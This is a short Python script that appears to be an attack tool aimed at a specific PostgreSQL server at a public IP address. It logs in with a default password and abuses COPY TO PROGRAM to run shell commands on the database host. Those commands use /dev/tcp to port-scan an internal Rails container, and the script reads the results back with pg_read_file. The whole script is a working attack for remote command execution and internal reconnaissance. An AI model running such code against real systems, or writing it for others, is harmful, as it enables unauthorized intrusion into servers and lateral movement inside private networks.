#!/usr/bin/env python3
"""Scan Rails container via PostgreSQL COPY PROGRAM"""
import subprocess

HOST = "38.107.234.149"
PG_CMD = ["psql", "-h", HOST, "-U", "lago", "-d", "lago"]

# First scan ports
scan_cmd = "for p in 3000 3001 3002 4000 5000 6000 7000 8000 8080 8888 9000 9090; do (echo >/dev/tcp/172.19.0.7/$p) 2>/dev/null && echo PORT_$p_OPEN || true; done > /tmp/scan_result.txt"

psql_cmd = PG_CMD + [
    "-c", "COPY (SELECT 'x') TO PROGRAM '{}' WITH CSV;".format(scan_cmd)
]
env = {"PGPASSWORD": "changeme"}
r = subprocess.run(psql_cmd, env=env, capture_output=True, text=True, timeout=30)
print("Scan sent:", r.stdout.strip())

# Read result
import time
time.sleep(5)

read_cmd = PG_CMD + [
    "-t", "-A", "-c", "SELECT pg_read_file('/tmp/scan_result.txt')"
]
r2 = subprocess.run(read_cmd, env=env, capture_output=True, text=True, timeout=10)
print("Results:")
print(r2.stdout.strip() or "[empty - no open ports found]")

if r2.stderr:
    print("Error:", r2.stderr[:200])
